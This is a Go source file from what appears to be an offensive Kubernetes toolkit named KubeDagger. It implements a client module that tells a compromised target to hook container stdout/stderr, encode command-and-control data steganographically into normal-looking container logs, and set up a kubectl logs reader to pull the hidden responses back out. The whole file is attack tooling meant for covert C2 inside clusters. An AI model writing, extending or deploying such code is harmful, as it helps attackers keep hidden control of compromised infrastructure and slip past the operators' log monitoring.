package container_log_c2

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type LogC2Result struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, container, encoding, output string) error {
	result := &LogC2Result{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_container_stdout",
			"intercept container stdout/stderr write path for steganographic encoding",
			"logc2_hook_stdout",
		},
		{
			"configure_encoding",
			"set encoding scheme for embedding C2 data in log messages",
			"logc2_set_encoding",
		},
		{
			"inject_c2_data",
			"embed encoded command responses in normal-looking container log output",
			"logc2_inject_data",
		},
		{
			"setup_reader",
			"configure kubectl logs reader to extract and decode hidden C2 responses",
			"logc2_setup_reader",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + container + "#" + encoding
		status := shared.SendCommand(target, "/container_log_c2", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
